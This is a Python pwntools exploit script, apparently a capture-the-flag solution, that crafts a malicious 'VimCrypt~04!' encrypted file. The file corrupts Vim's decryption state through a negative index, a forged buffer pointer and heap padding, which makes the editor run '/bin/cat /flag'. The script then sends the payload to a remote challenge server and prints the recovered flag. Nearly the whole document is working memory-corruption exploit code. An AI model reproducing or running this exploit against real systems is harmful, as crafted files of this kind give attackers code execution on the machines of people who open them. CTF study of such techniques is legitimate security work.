import itertools
import string
from hashlib import sha256

from pwn import *


def is_prime(x):
    i = 2
    while i * i <= x:
        if x % i == 0:
            return False
        i += 1
    return True

# initial value
key = ord('a')
header = 'VimCrypt~04!'

payload_size = 180
buffer_size = 0xc1
shift = key % payload_size

prime_size = payload_size

# controlled value
step = 0xffffffff
iv = p32(step ^ key, endian='big')

cur_idx = 0xffffffe0  # -32
buffer = 0x8A8238 - 0x20  # free

content = "/bin/cat /flag".ljust(0x20, "\x00")
content += p64(0x4C915d)

while not is_prime(prime_size):
    prime_size += 1

for highest in range(256):
    overwrite = (highest << 24) + 0xffffff
    if overwrite % prime_size == 1:
        break

'''
int key;
int shift;
int step;
int orig_size;
int size;
int cur_idx;
char_u *buffer;
'''

payload = '\x00' + p32(0) + p64(buffer_size, endian='big') + p64(0)
payload += p64(buffer, endian='big')
payload += p32(cur_idx, endian='big')
payload += p32(prime_size, endian='big')
payload += p32(payload_size, endian='big')
payload += chr(highest)
payload += 'X' * (40 + payload_size - prime_size)  # cur_idx is 0 again
payload += content

print 'minimum: %d' % len(payload)
print 'orig_size: %d' % payload_size
print 'size: %d' % prime_size
print 'shift: %d' % shift
print '%3d: %08x' % (highest, overwrite)

payload += 'Q' * (payload_size - len(payload))  # padding for heap feng shui

payload = header + iv + payload

p = remote('111.186.63.13', 10001)

# proof of work
p.recvuntil('sha256(XXXX+')
pow_suffix = p.recvn(16)
p.recvuntil(') == ')
pow_value = p.recvline().strip()

candidate = string.ascii_letters + string.digits
log.info('sha256(XXXX+%s) == %s' % (pow_suffix, pow_value))

for pow_prefix in itertools.product(string.ascii_letters + string.digits, repeat=4):
    pow_prefix = ''.join(pow_prefix)
    digest = sha256(pow_prefix + pow_suffix).hexdigest()
    if digest == pow_value:
        break

log.success('sha256(%s+%s) == %s' % (pow_prefix, pow_suffix, pow_value))
p.recvuntil('Give me XXXX:')
p.sendline(pow_prefix)

p.recvuntil('OK\n')
p.sendline(str(len(payload)))
p.send(payload)

p.recvuntil('flag{')
print 'flag{%s}' % p.recvuntil('}', drop=True)

# flag{Th4t_st0ry_I_to1d_you_abOut_thE_boy_poet_aNd_th3_girl_poet,_Do_y0u_r3member_thAt?_THAT_WASN'T_TRUE._IT_WAS_SOMETHING_I_JUST_MADE_UP._Isn't_that_the_funniest_thing_you_have_heard?}
